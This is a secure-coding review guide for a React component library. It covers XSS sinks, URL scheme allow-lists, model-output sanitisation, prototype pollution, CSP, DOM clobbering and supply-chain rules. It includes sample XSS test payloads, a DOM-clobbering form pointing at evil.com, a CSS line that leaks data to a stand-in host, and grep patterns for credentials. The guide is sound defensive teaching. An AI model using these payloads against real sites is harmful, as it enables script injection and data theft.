# Security — `@airo-ux/pattern-library`

Security rules are **Critical** severity by default. Every item on this page
blocks merge until fixed, unless explicitly annotated with a lower severity.

## Scope and posture

`@airo-ux/pattern-library` is a **primitive library**, not an application. Consumer
apps own auth, sessions, CSRF, SSRF, SQL, TLS, cookies, and the CSP / Trusted
Types / feature-policy headers that travel with the response. We own:

- What a component **renders** (XSS, HTML injection, URL handling).
- What a component **executes** (`eval`, dynamic `Function`, `setTimeout(string)`).
- What a component **reads or writes** (storage, clipboard, `postMessage`,
  telemetry, refs into the live DOM).
- What a component **binds** from untrusted input (prop spreads, object
  merges, attribute injection).
- What a component **exposes in docs** (hardcoded secrets, internal
  hostnames, credentialed URLs).

If a rule here overlaps with
[`BUSINESS-LOGIC.md`](./BUSINESS-LOGIC.md) (e.g. no storage, no env reads,
no network calls), this page states the security rationale and the other
page states the architectural one. Both fire.

Severity annotations inline: **(Critical)**, **(High)**, **(Important)**,
**(Minor)**. Anything unannotated is Critical.

---

## 1. Secrets, tokens, internal hostnames

Rule ID: `security-hardcoded-secret`.

- No hardcoded secrets, API tokens, registry auth tokens, JWTs, signing
  keys, webhook secrets, or internal GoDaddy hostnames in published source,
  stories, README snippets, JSDoc `@example` blocks, or tests.
- No credentialed registry URLs (`https://user:token@...`).
- `.npmrc` at the repo root is local-dev-only. It must not contain an
  `_authToken`, `_password`, or any other credential line. Reject the first
  commit that introduces one — tokens belong in `~/.npmrc`.
- No leakage of internal-only paths (artifactory URLs with embedded
  credentials, internal JIRA / Confluence URLs with session tokens,
  internal service hostnames that aren't public product names).
- Environment-variable reads inside a component (`process.env.*`,
  `import.meta.env.*`) are already blocked by
  [`BUSINESS-LOGIC.md`](./BUSINESS-LOGIC.md). The security rationale is the
  same: "temporarily read a secret so the component works" is the most
  common way a credential ends up shipped in a published bundle.

Never quote the secret itself in the review comment. Reference the file and
line and say "credential detected; rotate and redact".

**Grep**

```bash
rg -n "api[_-]?key|secret|token|password|_authToken" -g '!**/package-lock.json' -g '!**/*.snap'
rg -n "AKIA[0-9A-Z]{16}|-----BEGIN (RSA |EC |)PRIVATE KEY-----|xox[baprs]-[A-Za-z0-9-]+"
```

---

## 2. Safe-by-default rendering — no unsafe HTML sinks

Rule IDs: `security-dangerous-inner-html`, `security-dom-sink`,
`security-unsafe-eval`.

JSX auto-escapes `{userInput}` and attribute bindings like
`<div className={userInput}>` / `<input value={userInput}>` — that is the
only contract we rely on for text safety. Everything below bypasses it and
is forbidden on any value the component did not itself construct as a
compile-time constant.

### 2.1 JSX escape hatches — all forbidden on untrusted input

```jsx
<div dangerouslySetInnerHTML={{ __html: untrusted }} />  // Critical
<Trans i18nKey={...}>{untrustedRawMarkup}</Trans>        // Critical
React.createElement('script', null, untrusted)           // Critical
```

If the component genuinely has to render HTML (e.g. rendering markdown
received from the model or the consumer), the sanitisation layer is
**owned by the component**, not the consumer. It must:

- Strip `<script>`, `<iframe>`, `<object>`, `<embed>`, `<meta>`, `<link>`,
  `<base>`, `<form>`, `<input>`, `<style>` at a minimum.
- Strip inline event handlers (`on*` attributes), `srcdoc`, and
  `formaction`.
- Allow only a documented tag/attribute set (schema-driven — e.g. a remark
  allow-list or DOMPurify config).
- Strip `id` and `name` attributes from untrusted HTML (see §7 on DOM
  clobbering).
- Enforce the scheme allow-list from §3 on any surviving `href`/`src`.
- Be covered by tests that feed at least these hostile payloads:
  `<script>alert(1)</script>`,
  `<img src=x onerror=alert(1)>`,
  `<svg onload=alert(1)>`,
  `<a href="javascript:alert(1)">x</a>`,
  `<iframe srcdoc="<script>alert(1)</script>">`,
  `<form id=location>…` (DOM clobber),
  `<p>\u202e...</p>` (bidi override).

### 2.2 Direct DOM writes via refs — forbidden

```tsx
const ref = useRef<HTMLDivElement>(null);
useEffect(() => {
  ref.current!.innerHTML = content;                      // Critical
  ref.current!.outerHTML = content;                      // Critical
  ref.current!.insertAdjacentHTML('beforeend', content); // Critical
  document.write(content);                               // Critical
  document.writeln(content);                             // Critical
}, [content]);
```

There is effectively **no legitimate reason** for a primitive in this
library to touch `innerHTML`/`outerHTML`/`insertAdjacentHTML` against
anything that isn't a compile-time constant. If you think you need to,
escalate (see [`SKILL.md`](../SKILL.md)).

### 2.3 Dynamic code execution — forbidden

```js
eval(anything)            // Critical
new Function(anything)    // Critical
setTimeout(stringArg, 0)  // Critical — always use a function, never a string
setInterval(stringArg, 0) // Critical
window.Function(...)      // Critical
```

`new Function(...)` is also a Trusted-Types violation under a strict CSP
(see §8).

### 2.4 Ref callbacks that bypass React

A ref callback that forwards untrusted content to a DOM sink is the same
violation as §2.2:

```tsx
<div ref={(el) => { if (el) el.innerHTML = untrusted; }} /> // Critical
```

**Grep**

```bash
rg -n "dangerouslySetInnerHTML|\.innerHTML\s*=|\.outerHTML\s*=|insertAdjacentHTML|document\.write|\beval\(|new Function\(|setTimeout\(\s*['\"]|setInterval\(\s*['\"]" \
  --type ts --type tsx --type js --type jsx
```

---

## 3. URL, link, navigation handling

Rule IDs: `security-unsanitised-url`, `security-missing-rel-noopener`,
`security-missing-rel-noreferrer`, `security-programmatic-nav`.

### 3.1 Scheme allow-list on `href` / `src`

Any `href`, `src`, `action`, `formaction`, `poster`, `data`, or
`background` built from consumer- or model-provided input must pass a
scheme allow-list. The default allow-list is:

- `http:` / `https:` — always allowed.
- `mailto:` / `tel:` / `sms:` — allowed on `<a href>` only; not on `<iframe
  src>` or `<img src>`.
- Relative URLs and fragment identifiers (`#...`, `/foo`, `./foo`,
  `../foo`) — always allowed.

Explicitly blocked (all **Critical**):

- `javascript:` — code execution.
- `data:` — data-URL XSS vector, especially `data:text/html` and
  `data:application/xhtml+xml`. A component may use `data:image/*` it
  constructed itself (e.g. a generated SVG) but must never forward a
  `data:` URL received from a prop.
- `vbscript:` — legacy IE XSS.
- `file:` — local file disclosure.
- `about:` / `blob:` — forward only if the component itself created the
  blob URL via `URL.createObjectURL` on a value it owns.

Validate with `new URL(value, window.location.href)` and check
`url.protocol` against the allow-list. Never regex the raw string — URL
parsing edge cases (whitespace, null bytes, encoding) defeat regex.

### 3.2 `target="_blank"` always pairs with both `rel` tokens

```jsx
<a href={url} target="_blank" rel="noopener noreferrer">   // Correct
<a href={url} target="_blank" rel="noopener">              // Important — missing noreferrer leaks Referer
<a href={url} target="_blank">                             // Critical — tab-napping via window.opener
```

Modern browsers imply `noopener` when `target="_blank"` is set, but we ship
a library — we don't control which browser / WebView / React Native web
fallback our components render in. Be explicit.

`noreferrer` is required whenever the destination is not same-origin /
same-brand, to avoid leaking the current URL (and any query-string
parameters, which may include tokens).

### 3.3 No programmatic navigation from untrusted input

```js
location = untrusted              // Critical
location.href = untrusted         // Critical
location.assign(untrusted)        // Critical
location.replace(untrusted)       // Critical
window.open(untrusted, '_blank')  // Critical
history.pushState(null, '', untrusted) // High — URL-spoofing / cache-poisoning surface
```

Components do not navigate. If the consumer wants to navigate when the
user interacts with the component, expose an `onSelect` / `onAction`
callback and let them.

**Grep**

```bash
rg -n "href\s*=\s*\{|src\s*=\s*\{|target=['\"]_blank['\"]|window\.open|location\.(href|assign|replace)\s*=|history\.(push|replace)State" --type tsx --type jsx --type ts
```

---

## 4. Chat / streaming surfaces — model output is untrusted

Rule IDs: `security-model-output-html`, `security-bidi-control-char`,
`security-model-copy-raw`.

`@airo-ux/pattern-library/chat/*` and any future streaming surface renders LLM
output. Treat that output **as untrusted by default**, identical to
arbitrary third-party HTML.

### 4.1 Render as text, unless you've built a sanitiser

- The default render path for model output is plain text (`{content}` in
  JSX).
- If the component renders markdown, use a hardened pipeline:
  - `remark` / `rehype` with `rehype-sanitize` and an explicit schema
    (allow: `p`, `ul`, `ol`, `li`, `strong`, `em`, `code`, `pre`, `a`,
    `blockquote`, `h1`–`h6`; disallow everything else).
  - Or render to HTML first and post-process with `DOMPurify`.
- If the component renders syntax-highlighted code, the highlighter's
  output must go through the same sanitiser — highlighter HTML is still
  HTML.
- The sanitiser lives in the component, not in a hook the consumer is
  expected to remember. "Consumer must sanitise" is the same as "not
  sanitised".

### 4.2 Strip hidden control characters from copy paths

Components that expose **copy** or **share** affordances for model output
must copy the **rendered text**, not the raw model payload, and must
strip or normalise:

- Bidi overrides: `U+202A` (LRE), `U+202B` (RLE), `U+202C` (PDF),
  `U+202D` (LRO), `U+202E` (RLO), `U+2066`–`U+2069` (isolates). These
  enable "Trojan Source"-style re-ordering attacks where rendered code
  is different from clipboard content.
- Zero-width characters: `U+200B` (ZWSP), `U+200C` (ZWNJ), `U+200D` (ZWJ),
  `U+FEFF` (BOM).
- Private-use-area glyphs: `U+E000`–`U+F8FF`. Often used as prompt-
  injection markers.

A `normalise(text)` utility that applies `text.replace(/[\u202A-\u202E\u2066-\u2069\u200B-\u200D\uFEFF\uE000-\uF8FF]/g, '')`
on copy is the minimum baseline. Unit-test it against each range.

### 4.3 No auto-execution of agent-style output

Chat primitives **surface intent**, they never **invoke**. If a model
returns "click here to delete your account" or a tool-call token, the
component renders it; it does not act. This rule is enforced by
[`BUSINESS-LOGIC.md`](./BUSINESS-LOGIC.md) (no network calls, no routing)
but has an explicit security rationale: indirect prompt injection
(OWASP LLM01) turns into RCE the moment a UI primitive decides to act
on content it renders.

**Grep**

```bash
rg -n "clipboard\.writeText|navigator\.clipboard" --type tsx --type ts
```

---

## 5. Props, object merges, prototype pollution

Rule IDs: `security-prototype-pollution`, `security-unsafe-spread`.

Primitives accept open-ended props (`...rest`, `data-*`, `className`).
Three defensive rules:

### 5.1 Never deep-merge consumer objects without a guard

If a component accepts a consumer-supplied object (e.g. `styles={{...}}`,
`config={{...}}`), either:

- Shallow-merge only (`{ ...defaults, ...user }`), or
- Use a prototype-safe deep merge that explicitly skips `__proto__`,
  `constructor`, and `prototype` keys, and uses `Object.create(null)` for
  accumulator objects.

```js
function safeMerge(target, source) {                     // Correct
  for (const key of Object.keys(source)) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;
    // ...
  }
}

Object.assign({}, target, userInput);                    // OK — shallow
lodash.merge({}, target, userInput);                     // Critical — prototype-polluting historically
$.extend(true, target, userInput);                       // Critical — jQuery deep-extend
```

### 5.2 `{...rest}` onto a DOM element is not automatically safe

Spreading consumer props onto an `<a>`, `<form>`, `<iframe>`, or any
element that takes a URL attribute re-introduces §3 (URL scheme) and §7
(DOM clobbering) concerns. Either:

- Whitelist which attributes you spread (`data-*`, `aria-*`, `className`,
  `id`, `role`), **or**
- Validate the URL attributes inside the component before render.

Spreading `{...rest}` onto a plain `<div>` is fine.

### 5.3 No `dangerouslySetInnerHTML` smuggled through `style` or `dangerouslySet*`-shaped props

If the component accepts a `render` prop or a `components={{...}}` map
(common in markdown / MDX wrappers), every entry in that map is a
potential `dangerouslySetInnerHTML` vector. Document which keys accept
functions and render the result through the sanitiser in §4.1.

---

## 6. Content Security Policy (CSP) and Trusted Types compatibility

Rule IDs: `security-csp-inline-style`, `security-csp-inline-script`,
`security-trusted-types-violation`.

Downstream consumers increasingly ship a strict CSP (`script-src 'nonce-...
'strict-dynamic'; style-src 'self'; object-src 'none'; base-uri 'none'`)
and enable the `require-trusted-types-for 'script'` directive. A component
that needs `'unsafe-inline'` or `'unsafe-eval'` is a component no
security-conscious consumer can ship. Rules:

- **No interpolated `style={{...}}` from untrusted input.** Static style
  objects are fine. `style={{ color: userValue }}` with an attacker-
  controlled `userValue` is a CSS-injection vector
  (`background:url(javascript:...)` in legacy browsers; plausible
  exfiltration via `background-image: url(https://evil/?${leak})` in
  current ones). Prefer classes + intent tokens from
  [`UXCORE-USAGE.md`](./UXCORE-USAGE.md).
- **No inline `on*` handlers set via `setAttribute`.**
  `element.setAttribute('onclick', ...)` is a CSP violation; use React's
  `onClick` prop, which registers a proper listener.
- **No `new Function(...)` or `eval(...)`** (§2.3). Both violate
  `require-trusted-types-for 'script'`.
- **Any `innerHTML`-like write is a Trusted-Types violation.** Our §2.2
  rule already forbids those; this re-states the CSP rationale.
- **No dynamic `<script>` injection via `document.createElement('script')`
  + `.src = untrusted`.** Violates `script-src` under any non-trivial
  policy.

A component that ships clean under strict CSP needs no changes to run
under permissive CSP. The inverse is not true.

---

## 7. DOM clobbering

Rule ID: `security-dom-clobber`.

When a component renders HTML that includes consumer- or model-supplied
`id` or `name` attributes (markdown, rich text, chat), those attributes
can collide with global `document.*` / `window.*` properties. Example:

```html
<!-- attacker HTML -->
<form id="location"><input name="href" value="https://evil.com"></form>
```

Any JS that does `document.location.href` inside the same page is now
reading from the form, not the real location object.

Rules:

- Sanitised-HTML pipelines (§4.1) **must strip `id` and `name`** from
  untrusted input, or scope them with a known prefix.
- Component code accessing DOM globals uses `window.*` explicitly
  (`window.location`, `window.navigator`, `window.history`), never
  `document.X`, for any `X` that could collide with a named child.
- Don't call `document.getElementById(untrusted)` in a component. Use
  refs.

---

## 8. Iframes

Rule ID: `security-iframe-missing-sandbox`.

We ship no iframe-rendering primitive today. If you add one (embedded
preview, sandboxed demo, chat-inline iframe):

- `sandbox` is **mandatory** and must be present on every `<iframe>` that
  loads third-party / user-supplied / model-supplied content. A missing
  `sandbox` attribute is a Critical finding. An empty `sandbox=""` is the
  most restrictive and is the correct default.
- **Never combine `allow-same-origin` and `allow-scripts`** in the same
  iframe for third-party content — it is equivalent to no sandbox at
  all.
- Apply §3.1's scheme allow-list to `src`.
- Apply §3.2's `referrerpolicy="no-referrer"` if the iframe loads an
  external URL.
- Set `loading="lazy"` and a reasonable `allow="..."` (feature-policy)
  allow-list; default is deny.

---

## 9. `postMessage` and `window.name`

Rule ID: `security-postmessage-wildcard`.

If a component posts messages (embedded widget scenarios):

- `target.postMessage(data, targetOrigin)` — `targetOrigin` is
  **mandatory** and must be a specific origin. `'*'` is a Critical
  finding. If the origin isn't known at compile time, require the
  consumer to pass it in as a prop.
- On receive: `window.addEventListener('message', (event) => {
  if (event.origin !== EXPECTED) return; ... })`. Missing the
  `event.origin` check is Critical.
- Never trust `event.source` without the origin check; `source` is a
  window reference and the attacker controls it.

`window.name` persists across navigations and is cross-origin writable
in some browser configurations. Components do not read `window.name`.

---

## 10. Storage, clipboard, telemetry, observability

Rule IDs: `security-storage-in-component`, `security-clipboard-read`,
`security-telemetry-in-component`.

- **No `localStorage`, `sessionStorage`, `IndexedDB`, or `Cache Storage`
  writes from inside a component.** Architecturally blocked by
  [`BUSINESS-LOGIC.md`](./BUSINESS-LOGIC.md); security rationale:
  components are shared across tenants in the same browser context, and
  unscoped storage writes cross tenant boundaries.
- **No `document.cookie` writes from inside a component.** Same rationale
  plus: cookie flags (`Secure`, `HttpOnly`, `SameSite`) are a consumer-
  deployment decision, not a library decision.
- **`navigator.clipboard.readText()` is Critical**. It prompts the user
  for clipboard-read permission, which a primitive has no business
  requesting. `writeText()` is allowed for explicit user-initiated copy
  affordances (e.g. a "Copy" button), and must copy rendered text per
  §4.2.
- **No analytics / beacon / telemetry from inside a component.** No
  `navigator.sendBeacon`, no `fetch('/telemetry', ...)`, no
  `window.dataLayer.push`, no Sentry / Datadog / Splunk calls. Expose
  events via callback props and let the consumer decide what leaves the
  browser. The security rationale on top of the architectural one: a
  primitive that beacons home from inside a component creates a covert
  channel that bypasses the consumer's CSP `connect-src` allow-list
  review.

---

## 11. Error boundaries and logging

Rule ID: `security-error-leak`.

Error objects can carry file paths, stack frames pointing at internal
modules, request headers, and occasionally user input that failed
validation.

- **Never render `error.stack` or `error.message` directly** in a
  production-facing UI. If the component ships a fallback UI, it renders
  a static message; verbose details go to the consumer via an
  `onError(error)` callback.
- **Never `console.error(error, { headers, body, ... })`** where the
  bag might include credentials. `console.error(error)` with just the
  `Error` itself is acceptable.
- Never include the `Error` object in a `data-*` attribute — DOM
  attributes are readable cross-iframe if the consumer composes poorly.

---

## 12. Regular expression denial of service (ReDoS)

Rule ID: `security-redos`. Severity: **High**.

Any regex that runs against model output, clipboard content, or arbitrary
consumer-supplied strings must not have catastrophic backtracking.
Reject patterns with nested quantifiers on overlapping character classes
(classic ReDoS shapes): `(a+)+`, `(a*)*`, `(.*)*`, `(a|a)*`, `(a|aa)*`,
`([^\s]+)+`. Prefer:

- `String.prototype.startsWith` / `endsWith` / `includes` for simple
  prefixes/suffixes/substrings.
- Linear matchers (a single character class with one quantifier).
- A pre-vetted library (`escape-string-regexp` for building dynamic
  regexes from untrusted input).

All regexes in chat / streaming components must be covered by a test that
feeds a `1_000 × "a" + "!"` payload and asserts the matcher returns in
under 50ms.

---

## 13. Build-time and dependency security

Rule IDs: `security-new-runtime-dep`, `security-peer-range-drift`.

- No new top-level runtime dependency without an entry in
  [`ALLOWED-LIBRARIES.md`](./ALLOWED-LIBRARIES.md) and the escalation
  process in [`SKILL.md`](../SKILL.md). New deps are a supply-chain
  surface; we keep the surface small on purpose.
- `peerDependencies` for `@ux/*` stay at `^2400 || ^2500`. Silently
  widening or narrowing breaks consumers on one of the two supported
  majors. This is a Critical finding.
- No `postinstall`, `preinstall`, `install`, or `prepare` scripts in
  `package.json` beyond the audited `prepack` (which only runs
  `npm run build` when the package is being packed for publish).
  Adding a new one is an escalation — post-install scripts are the #1
  npm supply-chain vector.
- No `git+ssh://`, `http(s)://`, `file:`, or tarball URLs in
  `dependencies` / `devDependencies`. Registry-resolved packages only,
  pinned by `package-lock.json`.

---

## Severity and rule-ID reference

Surface findings in the review output under **Critical Issues** (or
lower-severity headings where annotated) with the rule IDs below. Copilot
and local agents cite these IDs verbatim — keep them stable.

| Rule ID | Section | Severity |
|---------|---------|----------|
| `security-hardcoded-secret` | §1 | Critical |
| `security-dangerous-inner-html` | §2.1 | Critical |
| `security-dom-sink` | §2.2 | Critical |
| `security-unsafe-eval` | §2.3 | Critical |
| `security-unsanitised-url` | §3.1 | Critical |
| `security-missing-rel-noopener` | §3.2 | Critical |
| `security-missing-rel-noreferrer` | §3.2 | Important |
| `security-programmatic-nav` | §3.3 | Critical |
| `security-model-output-html` | §4.1 | Critical |
| `security-bidi-control-char` | §4.2 | High |
| `security-model-copy-raw` | §4.2 | High |
| `security-prototype-pollution` | §5.1 | Critical |
| `security-unsafe-spread` | §5.2 | High |
| `security-csp-inline-style` | §6 | High |
| `security-csp-inline-script` | §6 | Critical |
| `security-trusted-types-violation` | §6 | Critical |
| `security-dom-clobber` | §7 | High |
| `security-iframe-missing-sandbox` | §8 | Critical |
| `security-postmessage-wildcard` | §9 | Critical |
| `security-storage-in-component` | §10 | Critical |
| `security-clipboard-read` | §10 | Critical |
| `security-telemetry-in-component` | §10 | Critical |
| `security-error-leak` | §11 | High |
| `security-redos` | §12 | High |
| `security-new-runtime-dep` | §13 | High |
| `security-peer-range-drift` | §13 | Critical |

Include the file, line, the payload/pattern that triggered the rule, and a
concrete suggested fix. Never quote a detected secret; reference it by
location and say "credential detected; rotate and redact".

---

## Related reviews in this repo

- [`BUSINESS-LOGIC.md`](./BUSINESS-LOGIC.md) — architectural reasons
  a component never reads env vars, writes storage, or makes network
  calls. Reinforces §1, §10, and §4.3.
- [`ALLOWED-LIBRARIES.md`](./ALLOWED-LIBRARIES.md) — supply-chain
  allow-list that §13 enforces.
- [`UXCORE-USAGE.md`](./UXCORE-USAGE.md) — intent-token rules that make
  §6's "no interpolated `style` from untrusted input" achievable in
  practice.
- [`CHECKLIST.md`](./CHECKLIST.md) — the 16-item ship-readiness gate
  references these rules under "a11y attributes", "internal states",
  "cross-browser", and "examples".

## Sources and further reading

Rules on this page are written for the `@airo-ux/pattern-library` context but
synthesise established guidance:

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
  and [OWASP DOM-based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
  — §2, §3.
- [OWASP Prototype Pollution Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)
  — §5.
- [OWASP DOM Clobbering Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html)
  — §7.
- [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
  and [W3C Trusted Types](https://w3c.github.io/trusted-types/dist/spec/) — §6.
- [OWASP Top 10 for LLM Applications 2025](https://genai.owasp.org/llm-top-10/) — §4.
- [MDN `postMessage` security](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage#security_concerns) — §9.
- [Trojan Source (CVE-2021-42574)](https://trojansource.codes/) — §4.2 bidi stripping.
- [CWE-79](https://cwe.mitre.org/data/definitions/79.html) (XSS),
  [CWE-601](https://cwe.mitre.org/data/definitions/601.html) (open redirect),
  [CWE-1321](https://cwe.mitre.org/data/definitions/1321.html)
  (prototype pollution).
